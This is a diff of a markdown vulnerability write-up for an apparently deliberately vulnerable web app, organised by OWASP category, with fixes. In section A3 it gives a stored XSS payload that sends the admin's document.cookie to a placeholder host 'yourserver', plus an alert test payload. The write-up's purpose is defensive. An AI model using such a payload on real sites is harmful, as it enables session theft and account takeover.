@@ -35,11 +35,17 @@ The admin credentials could be stored in the database with the password salted +
 
 ## A3
 There are both Stored and Reflected XSS vulnerabilities. The Stored XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
-How (stored XSS): Enter this code into the address field on the SignUp page;
+### How to identify (stored XSS)
+Enter this code into the address field on the SignUp page;
+
 ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
-When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”. But you can also test with code like this, in any of the fields on the SignUp page; 
-<body onload=alert('hello')>
-Fix:  Html codes should be escaped using the htmlspecialchars or htmlentities PHP-functions + the input validated as tightly as possible (length, allowed characters, format etc.).
+
+When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”.<br> 
+But you can also test with code like this, in any of the fields on the SignUp page; 
+```<body onload=alert('hello')>```
+
+### How to fix:  
+Html codes should be escaped using the htmlspecialchars or htmlentities PHP-functions + the input validated as tightly as possible (length, allowed characters, format etc.).
 
 ## A6
 Credit card numbers are sent without SSL in cleartext with POST, and stored unencrypted in the database. And, the session cookie and the admin credentials can be stolen since SSL is not in use (see A2).
